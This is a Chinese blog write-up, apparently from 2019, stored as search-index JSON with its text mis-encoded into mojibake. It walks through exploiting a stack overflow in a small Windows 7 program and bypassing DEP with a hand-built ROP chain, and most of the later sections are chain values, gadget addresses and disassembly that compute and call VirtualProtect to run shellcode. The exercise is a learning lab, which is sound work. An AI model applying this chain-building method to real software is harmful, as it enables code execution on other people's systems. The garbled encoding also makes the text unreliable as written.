ç‰¹å®šçš„æº¢å‡ºå†…å®¹ï¼Œä½¿ç¨‹åºé€šè¿‡RETæŒ‡ä»¤è·³è½¬åˆ°æ„é€ çš„å†…å®¹å»æ‰§è¡Œç›¸åº”çš„æŒ‡ä»¤ï¼Œè€Œæ„é€ çš„å†…å®¹åˆ™æ˜¯ç¨‹åºè‡ªèº«æ¨¡å—ä¸­çš„ä»£ç æ®µçš„åœ°å€ï¼Œè¿™æ ·ç¨‹åºå»æ‰§è¡Œæ—¶åˆ™ä¸ä¼šè§¦å‘DEPã€‚ä¸€èˆ¬æ„é€ çš„ROPé“¾æ˜¯æ„é€ VirtualProtectå‡½æ•°å»æŠŠæ ˆç©ºé—´ä¿®æ”¹ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç„¶åå†è·³è½¬åˆ°æ ˆç©ºé—´å»æ‰§è¡ŒShellCodeã€‚ ROPçš„åŸç†å¤§æ¦‚æ‡‚äº†ï¼Œä½†ä¸€ç›´æ²¡æœ‰æœºä¼šè¿›è¡Œå®è·µï¼ŒæŸä¸€å¤©ï¼Œ@è€åˆ˜å‘æ¥ä¸€ä¸ªç¨‹åºï¼Œè¯´ç¨‹åºå­˜åœ¨æº¢å‡ºæ¼æ´ï¼Œå«æ‰¾åˆ°æº¢å‡ºç‚¹å¹¶åˆ©ç”¨ï¼Œäºæ˜¯å¼€æ•´ï¼ å®éªŒç¯å¢ƒï¼šWindows7 32ä½ å®éªŒç¯å¢ƒ\" å®éªŒç¯å¢ƒ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:1:0","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2. å¯»æ‰¾ç¨‹åºæº¢å‡ºç‚¹ï¼Œå°è¯•åˆ©ç”¨ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:2:0","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.1 ç¨‹åºåˆ†æ é¦–å…ˆåˆ†æç¨‹åºï¼Œçœ‹çœ‹ç¨‹åºåšäº†ä»€ä¹ˆã€‚ä»ä¸‹é¢å¯ä»¥çœ‹åˆ°ï¼Œè¯¥ç¨‹åºå°±æ˜¯ç®€å•çš„è¯»å–æ–‡ä»¶å†…å®¹å¹¶è¾“å‡ºï¼Œå¾ˆç®€å•çš„ä¸€ä¸ªå°ç¨‹åºã€‚åœ¨è¿™ç§ç¨‹åºä¸­ï¼Œå­˜åœ¨å¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºã€‚é¦–å…ˆè¯»å–æ–‡ä»¶æ—¶å…ˆè·å–äº†æ–‡ä»¶å¤§å°ï¼Œç„¶åæ ¹æ®å¤§å°è¯»å–äº†æ–‡ä»¶å†…å®¹å¹¶å­˜æ”¾åœ¨æ ˆç©ºé—´ï¼Œä½†æ ˆç©ºé—´ç©ºé—´ä¸å¤Ÿå¤§ï¼Œåªè¦æ„é€ è¶³å¤Ÿå¤§çš„æ–‡ä»¶ï¼Œè¿™ä¸ªç¨‹åºå¿…ç„¶ä¼šå´©æºƒï¼Œå‘ç”Ÿæº¢å‡ºã€‚ åˆ†æç¨‹åº\" åˆ†æç¨‹åº ","date":"2019-06-02","objectID":"/2019/06/first-rop/:2:1","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.2 æ„é€ æ–‡ä»¶ï¼Œä½¿å…¶æº¢å‡º æ„é€ çš„æ–‡ä»¶å¦‚ä¸‹ï¼š æ„é€ çš„æ–‡ä»¶\" æ„é€ çš„æ–‡ä»¶ è¿è¡Œç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºçš„ç¡®äº§ç”Ÿäº†æº¢å‡º ç¨‹åºæº¢å‡º\" ç¨‹åºæº¢å‡º ","date":"2019-06-02","objectID":"/2019/06/first-rop/:2:2","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"2.3 å¯»æ‰¾ JMP ESPï¼Œå°è¯•åˆ©ç”¨ è¿™é‡Œåªæ˜¯å…ˆå°è¯•æ˜¯å¦å¯åˆ©ç”¨ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œåœ¨kernel32.dllä¸­éšä¾¿æ‰¾äº†ä¸ªJMP ESPçš„æŒ‡ä»¤åœ°å€0x767CF7F7ï¼Œç„¶åæ„é€ æ–‡ä»¶å¹¶å°è¯•åˆ©ç”¨ DEPä¿æŠ¤\" DEPä¿æŠ¤ å¯ä»¥çœ‹åˆ°æ‰§è¡Œæ ˆä¸­çš„æ•°æ®æ—¶ï¼Œç¨‹åºæŠ¥å¼‚å¸¸äº†ï¼Œè¯´æ˜æ­¤ç¨‹åºå¼€å¯äº†DEPï¼Œéœ€è¦é€šè¿‡ROPç»•è¿‡æ‰è¡Œã€‚ æ³¨æ„ ODéœ€è¦å…³é—­æ’ä»¶å’Œé€‰é¡¹ä¸­çš„å¼‚å¸¸è·³è¿‡æ‰èƒ½è§‚å¯Ÿåˆ°å¼‚å¸¸äº§ç”Ÿ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:2:3","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"3.å¯»æ‰¾æœªå¼€å¯ ASLR çš„æ¨¡å— åœ¨æ„é€ ROPé“¾ä¹‹å‰ï¼Œéœ€è¦ä»ç¨‹åºçš„åŠ è½½æ¨¡å—ä¸­æ‰¾åˆ°æœªå¼€å¯ASLR(éšæœºåŸºå€)çš„æ¨¡å—ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯expçš„é€šç”¨æ€§ã€‚ ä½¿ç”¨MonaæŸ¥æ‰¾æœªå¼€å¯éšæœºåŸºå€çš„æ¨¡å— \u003e # windbgå‘½ä»¤ \u003e .load pykd.pyd # åŠ è½½python \u003e !py mona # æ‰§è¡Œmonaï¼Œè¿™é‡Œæ˜¯ä¸ºäº†ä¸‹è½½ç¬¦å· \u003e !py mona noaslr # æŸ¥æ‰¾æœªå¼€å¯aslrçš„æ¨¡å— ç»“æœå¦‚ä¸‹ï¼š æœªå¼€å¯ASLRçš„æ¨¡å—\" æœªå¼€å¯ASLRçš„æ¨¡å— å¯ä»¥çœ‹åˆ°æœªå¼€å¯éšæœºåŸºå€çš„æ¨¡å—åªæœ‰ä¸€ä¸ªï¼Œé‚£å°±æ˜¯ç¨‹åºæœ¬èº«ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„ROPé“¾åªèƒ½åœ¨ç¨‹åºæœ¬æ¨¡å—æ‰¾äº† è¿™é‡Œå¯ä»¥åœ¨Monaé‡Œå°è¯•è‡ªåŠ¨æŸ¥æ‰¾ROPé“¾ï¼š \u003e # windbgå‘½ä»¤ \u003e !py mona rop ç»“æœå¦‚ä¸‹ï¼š MonaæŸ¥æ‰¾ROPé“¾\" MonaæŸ¥æ‰¾ROPé“¾ å¯ä»¥çœ‹åˆ°é€šè¿‡MonaæŸ¥æ‰¾æ˜¯æ‰¾ä¸åˆ°å®Œæ•´çš„ROPé“¾çš„ï¼Œè¿˜æ˜¯å¾—è‡ªå·±æ‰‹åŠ¨æŸ¥æ‰¾ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:3:0","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4. æ„é€  ROP é“¾çš„æ€è·¯ æˆ‘è¿™é‡Œçš„æ€è·¯è¿˜æ˜¯æ„é€ VirtualProtectï¼Œä¿®æ”¹æ ˆç©ºé—´çš„å†…å­˜å±æ€§ï¼Œç„¶åè·³è½¬åˆ°æ ˆç©ºé—´æ‰§è¡ŒShellCodeã€‚ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:4:0","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.1 å¯»æ‰¾ VirtualProtect çš„åœ°å€ é¦–å…ˆéœ€è¦æ‰¾åˆ°èƒ½è·å–VirtualProtectåœ°å€çš„æ–¹æ³•ï¼Œå› ä¸ºVirtualProtectæ˜¯kernel32.dllä¸­çš„åœ°å€ï¼Œè€Œkernel32.dllåˆæ˜¯å¼€å¯éšæœºåŸºå€çš„ï¼Œæ‰€ä»¥VirtualProtectçš„åœ°å€è‚¯å®šä¸èƒ½å†™æˆç¡¬ç¼–ç ã€‚ æ€è·¯1ï¼šé€šè¿‡æœ¬ç¨‹åºçš„å¯¼å…¥è¡¨è·å–VirtualProtectçš„åœ°å€ï¼Œå› ä¸ºæœ¬ç¨‹åºçš„æ²¡æœ‰éšæœºåŸºå€çš„ï¼Œåªè¦å¯¼å…¥è¡¨ä¸­æœ‰VirtualProtectçš„åœ°å€ï¼Œé‚£ä¹ˆå°±å°†æ­¤IATçš„åœ°å€å†™æˆç¡¬ç¼–ç å°±èƒ½è·å–VirtualProtectçš„åœ°å€ï¼Œé‚£ä¹ˆå…ˆæ‰¾åˆ°ç¨‹åºçš„å¯¼å…¥è¡¨çœ‹çœ‹ï¼š ç¨‹åºå¯¼å…¥è¡¨\" ç¨‹åºå¯¼å…¥è¡¨ å¤©å…¬ä¸ä½œç¾ï¼Œå¯ä»¥çœ‹åˆ°å¯¼å…¥è¡¨ä¸­å¹¶æ²¡æœ‰å¯¼å…¥VirtualProtectï¼Œéœ€è¦å¦æƒ³åŠæ³•ã€‚ æ€è·¯2ï¼šé€šè¿‡ç¨‹åºä»£ç æ®µä¸­çš„mov xxx,fs:[0x30]è¿™ç§æŒ‡ä»¤ï¼Œè·å–kernel32.dllçš„é¦–åœ°å€ï¼Œç„¶åé€šè¿‡åç§»è·å–VirtualProtectçš„åœ°å€ï¼š FSå¯„å­˜å™¨\" FSå¯„å­˜å™¨ è¿™ä¸ªå°±æ›´æ²¡æœ‰äº†ï¼Œæ•´ä¸ªç¨‹åºä¸­ä¹Ÿå°±åªæœ‰ä¸Šå›¾ä¸­ä¸¤ç§å¯¹FSå¯„å­˜å™¨æ“ä½œçš„æŒ‡ä»¤ï¼Œæ‰€ä»¥è¿™æ¡è·¯ä¹Ÿä¸è¡Œäº†ã€‚ æ€è·¯3ï¼šç»è¿‡ @æ¢¦è½©è€å“¥çš„æé†’ï¼Œæ‰¾åˆ°è¿™æ ·ä¸€ç§æ–¹æ³•ï¼š é¦–å…ˆè·å–å¯¼å…¥è¡¨ä¸­kernel32.dllçš„å…¶ä»–APIåœ°å€ï¼Œæ±‚å‡ºVirtualProtectåœ°å€è·ç¦»è¿™ä¸ªAPIåœ°å€çš„åç§» ç„¶ååœ¨ç¨‹åºä¸­æ‰¾åˆ°ç›¸åŠ æˆ–ç›¸å‡çš„æŒ‡ä»¤åœ°å€ï¼Œå°†å…¶æ„é€ æˆROPé“¾ï¼Œè¿™æ ·å°±èƒ½è·å–åˆ°VirtualProtectçš„åœ°å€äº† ä¾‹å¦‚ä¸‹å›¾è¿™æ ·ï¼š é€šè¿‡åç§»è·å–åœ°å€\" é€šè¿‡åç§»è·å–åœ°å€ è¿™ä¸ªæ€è·¯çš„ç¡®èƒ½å¾ˆå‡†ç¡®çš„è·å–åˆ°VirtualProtectçš„åœ°å€ï¼Œä½†ä»…é™äºå½“å‰æµ‹è¯•çš„ç³»ç»Ÿç‰ˆæœ¬ä¸Šã€‚å› ä¸ºå…¶ä»–ç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿkernel32.dllä¸­çš„å‡½æ•°åœ°å€åç§»ä¼šå‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆè¿™ç§æ–¹å¼ä¹Ÿå°±å¤±æ•ˆäº†ã€‚ä¸è¿‡è‡³å°‘åœ¨è¿™ä¸ªç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸Šï¼Œè¿™ç§æ–¹å¼æ˜¯é€šæ€çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±é‡‡ç”¨è¿™ç§æ–¹å¼è·å–VirtualProtectçš„åœ°å€ã€‚ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:4:1","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.2 VirtualProtect çš„å‚æ•° æ‰§è¡ŒVirtualProtectï¼Œéœ€è¦ä¼ é€’å‚æ•°ã€‚VirtualProtectçš„åŸå‹æ˜¯è¿™æ ·çš„ï¼š BOOL VirtualProtect( LPVOID lpAddress, // éœ€è¦ä¿®æ”¹å±æ€§çš„å†…å­˜åœ°å€ SIZE_T dwSize, // ä¿®æ”¹çš„å¤§å° DWORD flNewProtect, // æ–°å±æ€§ PDWORD lpflOldProtect // å­˜æ”¾æ—§å±æ€§çš„ç¼“å†²åŒº ); åœ¨è¿™é‡Œå‚æ•°2å’Œå‚æ•°3å¯ä»¥ç¡®å®šï¼Œè€Œå‚æ•°1å’Œå‚æ•°4åˆ™éœ€è¦å¡«å†™æ ˆçš„åœ°å€ï¼Œå¦‚æœç¨‹åºå¼€å¯äº†éšæœºåŸºå€ï¼Œåˆ™ä¸èƒ½å†™æˆç¡¬ç¼–ç ï¼Œéœ€è¦åŠ¨æ€è·å–ã€‚å½“ç„¶è¿™é‡Œç¨‹åºæ²¡æœ‰éšæœºåŸºå€ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªå‚æ•°å¯ä»¥éšæ„æ‰¾ä¸€ä¸ªæ ˆåœ°å€ï¼Œå†™æˆç¡¬ç¼–ç å°±è¡Œäº†ã€‚ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:4:2","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"4.3 JMP æŒ‡ä»¤ æ‰§è¡ŒVirtualProtectä¹‹åï¼Œéœ€è¦è·³è½¬åˆ°å­˜æ”¾ShellCodeçš„æ ˆåœ°å€å»æ‰§è¡Œï¼Œæ‰€ä»¥æ‰§è¡ŒVirtualProtectä»£ç çš„ä½ç½®åé¢å¿…é¡»æœ‰JMP xxxæˆ–RETç­‰è¿™æ ·çš„æŒ‡ä»¤ï¼Œè¿™æ ·æ‰èƒ½è·³è½¬è¿‡å»ã€‚è€Œè¿™ä¸ªæ ˆåœ°å€å› ä¸ºæ¨¡å—æœªå¼€å¯éšæœºåŸºå€çš„åŸå› ï¼Œæ‰€ä»¥å¯ä»¥æµ‹è¯•ä¹‹åå°†è¿™ä¸ªåœ°å€å†™æˆç¡¬ç¼–ç ã€‚ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:4:3","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"5. å°è¯•æ„é€  ROP é“¾ è¿™é‡Œé‡‡ç”¨ä¸Šé¢çš„æ€è·¯3æ„é€ ROPé“¾ï¼Œå¤§æ¦‚åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š è·å–VirtualProtectåœ°å€ æ„é€ VirtualProtectå‚æ•° è°ƒç”¨VirtualProtect è·³è½¬åˆ°ShellCodeåœ°å€å¹¶æ‰§è¡Œ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:0","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"5.1 ç›¸å…³é—®é¢˜åˆ†æ é¦–å…ˆéœ€è¦æ„é€ ä¸€ä¸ªå­˜æ”¾APIåœ°å€çš„å¯¼å…¥è¡¨åœ°å€ï¼Œè¯¥APIå¿…é¡»ä¸VirtualProtectåŒå¤„äºä¸€ä¸ªæ¨¡å—ï¼Œä¹Ÿå°±æ˜¯kernel32æ¨¡å—ã€‚ æˆ‘è¿™é‡Œä½¿ç”¨å¯¼å…¥è¡¨ä¸­ç¬¬ä¸€ä¸ªAPIåœ°å€ï¼Œä»å‰é¢çš„å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå½“å‰ç¨‹åºçš„å¯¼å…¥è¡¨ç¬¬ä¸€ä¸ªAPIä¸ºkernel32.IsDebuggerPresentå‡½æ•°ï¼Œé‚£ä¹ˆéœ€è¦æ„é€ çš„æ˜¯å­˜æ”¾è¿™ä¸ªå‡½æ•°çš„å¯¼å…¥è¡¨åœ°å€ï¼Œä¹Ÿå°±æ˜¯0x402000ï¼Œè€Œä¸æ˜¯å‡½æ•°çš„å®é™…åœ°å€0x7675B02Bã€‚ ä¿¡æ¯ è¿™é‡Œè§£é‡Šä¸‹ä¸ºä»€ä¹ˆæ„é€ çš„æ˜¯å¯¼å…¥è¡¨çš„åœ°å€ï¼Œè€Œä¸æ˜¯ç›´æ¥æ„é€ æŸä¸ªå‡½æ•°çš„å®é™…åœ°å€ã€‚å› ä¸ºkernel32æ¨¡å—è‚¯å®šæ˜¯å¼€å¯äº†éšæœºåŸºå€çš„ï¼Œæ¯å°æœºå™¨çš„åŒä¸€ä¸ªå‡½æ•°çš„å®é™…åœ°å€éƒ½ä¸ä¸€è‡´ï¼Œå¦‚ä½•è·å–åˆ°å‡½æ•°çš„å®é™…åœ°å€ï¼Œé‚£å°±åªèƒ½é€šè¿‡å¯¼å…¥è¡¨æ¥è·å–ï¼Œè¿™ä¹Ÿæ˜¯å¯¼å…¥è¡¨å­˜åœ¨çš„æ„ä¹‰ã€‚è¦æ˜¯èƒ½ç›´æ¥æ„é€ ï¼Œé‚£ç›´æ¥æ„é€ VirtualProtectçš„åœ°å€å°±å®Œäº‹äº†ï¼Œä½•å¿…è¿˜è¦è´¹è¿™ä¹ˆå¤§åŠŸå¤«ã€‚ æ„é€ ä¹‹å‰ï¼Œéœ€è¦è€ƒè™‘ä¸¤ä¸ªé—®é¢˜ï¼š ä½¿ç”¨å“ªä¸ªå¯„å­˜å™¨ï¼Ÿ è¿™é‡Œä½¿ç”¨å“ªä¸ªå¯„å­˜å™¨éƒ½è¡Œï¼Œåªè¦èƒ½ç²¾å‡†æ§åˆ¶å¯„å­˜å™¨å°±å¯ä»¥ï¼Œä½†æ˜¯å¿…é¡»è¦ä¿è¯èƒ½é€šè¿‡è¿™ä¸ªå¯„å­˜å™¨å–åˆ°æ‰€åœ¨å†…å­˜çš„å€¼æ‰è¡Œã€‚å› ä¸ºå¦‚æœè¿™é‡Œä½¿ç”¨EAXï¼Œé‚£ä¹ˆåé¢å–APIåœ°å€çš„æ—¶å€™å¿…ç„¶ä¼šç”¨åˆ°MOV xxx,[EAX]è¿™æ ·çš„æŒ‡ä»¤ï¼Œä½†å¯èƒ½ç¨‹åºä¸­ä¸å­˜åœ¨è¿™æ ·çš„æŒ‡ä»¤ï¼Œæ‰€ä»¥å°±éœ€è¦å¤šæ¬¡æµ‹è¯•ï¼Œæ‰¾åˆ°å¯ç”¨çš„å¯„å­˜å™¨ã€‚ å¦‚ä½•å¾—åˆ°VirtualProtectçš„åœ°å€ï¼Ÿ è¿™é‡Œä½¿ç”¨åç§»æ¥å¾—åˆ°VirtualProtectçš„åœ°å€ï¼Œé‚£ä¹ˆå°±å¾—ä½¿ç”¨ç›¸åŠ æˆ–ç›¸å‡çš„è¯­å¥ã€‚å½“ç„¶å¦‚æœåˆšå¥½ç¨‹åºä¸­æœ‰ç›¸å…³çš„è¯­å¥æœ€å¥½ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†éƒ½æ²¡æœ‰è¿™ä¹ˆå¥½çš„äº‹ã€‚ä¾‹å¦‚kernel32.IsDebuggerPresentå‡½æ•°è·ç¦»VirtualProtectå‡½æ•°ä¸º0x50ï¼Œä½†å°±æ˜¯æ²¡æœ‰ADD EAXï¼Œ0x50è¿™æ ·çš„è¯­å¥å­˜åœ¨ï¼Œé‚£ä¹ˆå°±éœ€è¦æ”¹å˜æ€è·¯ï¼Œç”¨å¤šæ¡è¯­å¥ç›¸åŠ å‡å®ç°ã€‚ ä¸Šé¢ä¸¤ä¸ªé—®é¢˜çš„ä¸¾ä¾‹è¯­å¥ï¼š ; å¯„å­˜å™¨å–å€¼ MOV ECX, [EAX + 8] MOV ECX, [EBP - 8] ; å¤šæ¡è¯­å¥ç›¸åŠ å‡ ADD EAXï¼ŒEDX ADD EAX, 0x10 SUB EAX, EDX SUB EAX, 0x10 INC EAX DEC EAX ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:1","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"5.2 è·å– VirtualProtect åœ°å€ ç»™EAXèµ‹å€¼ï¼Œéœ€è¦ä¸åé¢åŒ¹é… ROPå€¼ è¯´æ˜ 7F154000 æº¢å‡ºåè·³è½¬çš„ç¬¬ä¸€ä¸ªåœ°å€ï¼Œç»™EAXèµ‹å€¼ F81F4000 ç»™EAXèµ‹çš„å€¼ 00000000 å¡«å……ç‰© 0040157F | 58 | pop eax ; EAX = 0x401FF8 00401580 | 5E | pop esi ; ESI = 0 00401581 | C3 | ret ; è·³åˆ°ä¸‹ä¸€ä¸ªæ„é€ å¥½çš„ROPé“¾ ç»™EDIå’ŒESIèµ‹å€¼ï¼Œåé¢ä¼šç”¨åˆ° ROPå€¼ è¯´æ˜ 84164000 ç¬¬äºŒä¸ªRETåœ°å€ï¼Œèµ‹å€¼åç§»ç»™ESI 00000000 ç»™EDIèµ‹å€¼ä¸º0ï¼Œåé¢ä¼šæ¯”è¾ƒEDI 80A0FFFF ç»™ESIèµ‹å€¼ï¼Œå°†ESIè®¾ç½®ä¸ºä¸€ä¸ªè´Ÿæ•°åç§»ï¼Œåé¢é€šè¿‡åŠ æ³•è·å–åˆ°VirtualProtectçš„åœ°å€(è¿™ä¸ªåç§»æ˜¯è®¡ç®—å¾—æ¥çš„) 00401684 | 5F | pop edi ; EDI = 0 00401685 | 5E | pop esi ; ESI = 0xFFFFA080 00401686 | C3 | ret ; è·³åˆ°ä¸‹ä¸€ä¸ªæ„é€ å¥½çš„ROPé“¾ é€šè¿‡EAXè·å–å¯¼å…¥è¡¨ä¸­å‡½æ•°çš„åœ°å€ï¼Œå› ä¸ºæ²¡æœ‰MOV xxx,[EAX]è¿™æ ·çš„æŒ‡ä»¤ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯mov ecx, dword ptr [eax + 8] ROPå€¼ è¯´æ˜ 9B134000 ç¬¬ä¸‰ä¸ªRETåœ°å€ï¼Œè·å– VirtualProtect åœ°å€ 00000000 å¡«å……ç‰© 00000000 å¡«å……ç‰© 00000000 å¡«å……ç‰© 00000000 å¡«å……ç‰© 0040139B | 8B 48 08 | mov ecx,dword ptr ds:[eax+8] ; eax+8 = 0x402000, è·å–åˆ°å¯¼å…¥è¡¨ä¸­çš„å‡½æ•°åœ°å€ 0040139E | 03 CE | add ecx,esi ; å°†å‡½æ•°åœ°å€åŠ ä¸Šåç§»å¾—åˆ°VirtualProtectåœ°å€ 004013A0 | 3B F9 | cmp edi,ecx 004013A2 | 72 0A | jb consoleapplication1.4013AE ; ediä¸º0ï¼Œæ‰€ä»¥ç›´æ¥è·³è½¬ 004013A4 | 42 | inc edx 004013A5 | 83 C0 28 | add eax,28 004013A8 | 3B D3 | cmp edx,ebx 004013AA | 72 E8 | jb consoleapplication1.401394 004013AC | 33 C0 | xor eax,eax 004013AE | 5F | pop edi ; ä»ä¸Šæ–¹è·³è½¬è‡³æ­¤ 004013AF | 5E | pop esi 004013B0 | 5B | pop ebx 004013B1 | 5D | pop ebp 004013B2 | C3 | ret ; è·³åˆ°ä¸‹ä¸€ä¸ªæ„é€ å¥½çš„ROPé“¾ è¿™é‡Œçš„ESIä¸ºåç§»ï¼Œè€Œè¿™ä¸ªåç§»éœ€è¦æ ¹æ®é€‰æ‹©çš„å‡½æ•°å’Œç³»ç»Ÿçš„ä¸åŒè€Œæ”¹å˜çš„ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:2","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"5.3 è½¬æ¢ ECX åˆ° EAX é€šè¿‡ä¸Šé¢çš„æ–¹æ³•ï¼ŒECXå·²ç»ä¸ºVirtualProtectçš„åœ°å€äº†ï¼Œä½†è¿™é‡Œæ²¡æœ‰CALL ECXè¿™æ ·çš„æŒ‡ä»¤ï¼Œæ‰€ä»¥è¿˜éœ€è¦å°†ECXè½¬æ¢åˆ°å…¶ä»–å¯„å­˜å™¨ä¸Šå»ã€‚å› ä¸ºè¿™é‡Œæœ‰CALL EAXï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯MOV EAX, ECX ROPå€¼ è¯´æ˜ 59144000 ç¬¬å››ä¸ªRETåœ°å€ï¼Œå°† VirtualProtect åœ°å€èµ‹å€¼ç»™EAX 00401459 | 8B C1 | mov eax,ecx ; eax = VirtualProtect 0040145B | C3 | ret ; è·³åˆ°ä¸‹ä¸€ä¸ªæ„é€ å¥½çš„ROPé“¾ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:3","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"5.3 å¤„ç†åç»­ ç°åœ¨EAXå·²ç»æ˜¯VirtualProtectçš„åœ°å€äº†ï¼Œå·²ç»å¯ä»¥CALL EAXäº†ã€‚ä½†è¿™é‡Œå¯»æ‰¾çš„CALL EAXæŒ‡ä»¤æ‰§è¡Œåè¿˜æ‰§è¡Œäº†å…¶ä»–çš„æŒ‡ä»¤ï¼Œä¼šå½±å“RETçš„ä½ç½®ï¼Œæ‰€ä»¥éœ€è¦å°†åç»­å¤„ç†å¥½ ROPå€¼ è¯´æ˜ 84164000 ç¬¬äº”ä¸ªRETåœ°å€ï¼Œå¤„ç†åç»­ 00000000 ç»™EDIèµ‹å€¼ä¸º0 00000000 ç»™ESIèµ‹å€¼ä¸º0 00401684 | 5F | pop edi ; EDI = 0 00401685 | 5E | pop esi ; ESI = 0 00401686 | C3 | ret ; è·³åˆ°ä¸‹ä¸€ä¸ªæ„é€ å¥½çš„ROPé“¾ ","date":"2019-06-02","objectID":"/2019/06/first-rop/:5:4","tags":["æº¢å‡º","ROP","æƒé™ç»•è¿‡"],"title":"ROPçš„ç¬¬ä¸€æ¬¡å®æˆ˜","uri":"/2019/06/first-rop/"},{"categories":["äºŒè¿›åˆ¶çš„å¥‡å¦™ä¹‹æ—…"],"content":"5.5 æ‰§è¡Œ VirtualProtect å¼€å§‹æ‰§è¡ŒVirtualProtectï¼Œéœ€è¦ä¼ é€’å‚æ•°ï¼Œæ‰€ä»¥æ„é€ çš„å†…å®¹è¿˜åŒ…æ‹¬å‚æ•° ROPå€¼ è¯´æ˜ 7B164000 ç¬¬å…­ä¸ªRETåœ°å€ï¼Œæ‰§è¡Œ VirtualProtect FCFF1200 VirtualProtectå‚æ•°1ï¼šå½“å‰æ ˆåœ°å€ 01000000 VirtualProtectå‚æ•°2ï¼šå¤§å° 40000000 VirtualProtectå‚æ•°3ï¼šä¿®æ”¹çš„å±æ€§ FCFF1200 VirtualProtectå‚æ•°4ï¼šéšæ„çš„æ ˆåœ°å€ 00000000 å¡«å……ç‰© 00000000 å¡«å……ç‰© 0040167B | FF D0 | call eax ; æ‰§è¡ŒVirtualProtect 0040167D | 83 C6 04 | add esi,4 ; esi = 4 00401680 | 3B F7 | cmp esi,edi ; ç¬¬ä¸‰æ­¥åšçš„å·¥ä½œå°±ä¸ºäº†è¿™é‡Œ 00401682 | 72 F1 | jb consoleapplication1.401675 